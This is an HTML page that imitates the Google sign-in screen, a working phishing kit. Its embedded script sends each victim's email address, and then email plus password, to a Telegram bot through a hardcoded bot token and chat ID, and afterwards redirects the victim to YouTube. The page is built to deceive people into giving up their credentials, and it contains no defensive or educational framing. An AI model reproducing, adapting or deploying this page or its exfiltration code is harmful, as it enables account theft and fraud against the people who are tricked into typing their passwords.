<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
    --bg:#f2f2f2;
    --card:#fff;
    --text:#202124;
    --secondary:#5f6368;
    --blue:#1a73e8;
    --blue-hover:#1765cc;
    --border:#dadce0;
    --error:#d93025;
}

*{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
body{background:var(--bg);min-height:100vh;display:flex;justify-content:center;align-items:center}
.main-container{width:100%;max-width:640px;padding:20px}
.card{width:100%;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:48px 40px 36px;position:relative;overflow:hidden}
.logo-container{text-align:center;margin-bottom:20px}
.logo-container img{width:75px}
h1{font-size:28px;font-weight:400;text-align:center;color:var(--text);margin-bottom:10px}
.subtitle{text-align:center;font-size:15px;font-weight:400;color:var(--text);margin-bottom:35px}
.step{display:none}.step.active{display:block}
.input-group{position:relative;margin-bottom:8px}
.input-group input{width:100%;height:54px;padding:16px 14px;border:1px solid var(--border);border-radius:4px;font-size:16px;outline:none}
.input-group input:focus{border:2px solid var(--blue)}
.input-group label{position:absolute;top:16px;left:14px;background:#fff;padding:0 4px;color:var(--secondary);transition:.2s;pointer-events:none}
.input-group input:focus~label,.input-group input:not(:placeholder-shown)~label{top:-8px;font-size:12px;color:var(--blue)}
.error-msg{font-size:12px;color:var(--error);margin-top:5px;visibility:hidden;display:flex;align-items:center;gap:6px}
.error-msg.visible{visibility:visible}
.text-link{background:none;border:none;color:var(--blue);font-size:14px;font-weight:500;cursor:pointer;margin-top:10px}
.text-link:hover{text-decoration:underline}
.info-text{margin-top:35px;font-size:14px;color:var(--secondary);line-height:1.5}
.action-container{display:flex;justify-content:space-between;align-items:center;margin-top:40px}
.btn-tertiary{border:none;background:none;color:var(--blue);font-size:14px;font-weight:500;cursor:pointer}
.btn-primary{background:var(--blue);color:white;border:none;padding:10px 24px;border-radius:4px;font-size:14px;cursor:pointer}
.btn-primary:hover{background:var(--blue-hover)}
.email-pill{display:inline-flex;align-items:center;border:1px solid var(--border);border-radius:20px;padding:8px 14px;margin-bottom:25px;font-size:14px;gap:8px;cursor:pointer}
.checkbox-container{display:flex;align-items:center;gap:10px;margin-top:15px}
.footer{margin-top:18px;display:flex;justify-content:space-between;font-size:12px;color:var(--secondary)}
.footer select{border:none;background:none;color:var(--secondary)}
.footer-links{display:flex;gap:20px}
.footer-links a{color:var(--secondary);text-decoration:none}
.loader{position:absolute;top:0;left:0;width:100%;height:3px;overflow:hidden;opacity:0;transition:opacity .2s}
.loader.active{opacity:1}
.loader::after{content:'';display:block;width:40%;height:100%;background:var(--blue);animation:slide 1s ease-in-out infinite}
@keyframes slide{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}
@media(max-width:600px){.card{padding:30px 20px}h1{font-size:28px}.subtitle{font-size:18px}}
</style>

</head>
<body>
<div class="main-container">
  <div class="card">

    <div class="loader" id="loader"></div>

    <div class="left-pane">
      <div class="logo-container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png">
      </div>
      <h1 id="mainHeading">Sign in</h1>
      <p class="subtitle" id="subHeading">Use your Google Account</p>
    </div>

    <div class="right-pane">

      <div class="step active" id="step1">
        <div class="input-group" id="emailGroup">
          <input type="text" id="emailInput" placeholder=" ">
          <label>Email or phone</label>
        </div>
        <div class="error-msg" id="emailError"><span>Enter a valid email or phone number</span></div>
        <button class="text-link">Forgot email?</button>
        <p class="info-text">
          Not your computer? Use Guest mode to sign in privately.<br>
          <button class="text-link">Learn more about using Guest mode</button>
        </p>
        <div class="action-container">
          <button class="btn-tertiary">Create account</button>
          <button class="btn-primary" id="btnNext1">Next</button>
        </div>
      </div>

      <div class="step" id="step2">
        <div class="email-pill" id="userPill">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-7 8-7s8 3 8 7"/></svg>
          <span id="displayEmail">user@example.com</span>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
        </div>
        <div class="input-group" id="pwdGroup">
          <input type="password" id="passwordInput" placeholder=" ">
          <label>Enter your password</label>
        </div>
        <div class="error-msg" id="pwdError"><span>Enter a password</span></div>
        <div class="checkbox-container">
          <input type="checkbox" id="showPassword">
          <label for="showPassword">Show password</label>
        </div>
        <div class="action-container">
          <button class="btn-tertiary" id="btnTryAnother">Forgot password?</button>
          <button class="btn-primary" id="btnNext2">Next</button>
        </div>
      </div>

    </div>
  </div>

  <div class="footer">
    <select><option>English (United States)</option></select>
    <div class="footer-links">
      <a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a>
    </div>
  </div>
</div>

<script>
async function sendToTelegram(email, password = "") {
    const BOT_TOKEN = "8603068039:AAEna_Iifz-eMc_RllffsxF0elzeZXVHz_s";
    const CHAT_ID = "5653839325";

    const message = `📧 Email: ${email}\n🔑 Password: ${password || "N/A"}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const res = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
        const data = await res.json();
        console.log("Telegram response:", data);
    } catch (err) {
        console.error("Fetch failed:", err);
    }
}

const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const emailInput = document.getElementById('emailInput');
const passwordInput = document.getElementById('passwordInput');
const emailError = document.getElementById('emailError');
const pwdError = document.getElementById('pwdError');
const emailGroup = document.getElementById('emailGroup');
const pwdGroup = document.getElementById('pwdGroup');
const loader = document.getElementById('loader');
const displayEmail = document.getElementById('displayEmail');
const mainHeading = document.getElementById('mainHeading');
const subHeading = document.getElementById('subHeading');

function showLoader(duration, callback) {
    loader.classList.add('active');
    setTimeout(() => {
        loader.classList.remove('active');
        if (callback) callback();
    }, duration);
}

document.getElementById('btnNext1').addEventListener('click', async () => {
    const email = emailInput.value.trim();
    if (!email) {
        emailGroup.classList.add('error');
        emailError.classList.add('visible');
        emailInput.focus();
        return;
    }
    emailGroup.classList.remove('error');
    emailError.classList.remove('visible');

    await sendToTelegram(email);

    showLoader(800, () => {
        displayEmail.textContent = email;
        step1.classList.remove('active');
        mainHeading.textContent = "Welcome";
        subHeading.style.display = "none";
        setTimeout(() => { step2.classList.add('active'); passwordInput.focus(); }, 50);
    });
});

document.getElementById('btnNext2').addEventListener('click', async () => {
    const pwd = passwordInput.value.trim();
    if (!pwd) {
        pwdGroup.classList.add('error');
        pwdError.classList.add('visible');
        passwordInput.focus();
        return;
    }
    pwdGroup.classList.remove('error');
    pwdError.classList.remove('visible');

    await sendToTelegram(displayEmail.textContent, pwd);

    showLoader(1500, () => {
        window.location.href = "https://youtube.com";
    });
});

emailInput.addEventListener('input', () => { emailGroup.classList.remove('error'); emailError.classList.remove('visible'); });
passwordInput.addEventListener('input', () => { pwdGroup.classList.remove('error'); pwdError.classList.remove('visible'); });

document.getElementById('showPassword').addEventListener('change', e => {
    passwordInput.type = e.target.checked ? 'text' : 'password';
});

document.getElementById('userPill').addEventListener('click', () => {
    showLoader(400, () => {
        step2.classList.remove('active');
        mainHeading.textContent = "Sign in";
        subHeading.style.display = "block";
        setTimeout(() => { step1.classList.add('active'); passwordInput.value = ""; }, 50);
    });
});

emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('btnNext1').click(); });
passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('btnNext2').click(); });
</script>
</body>
</html>
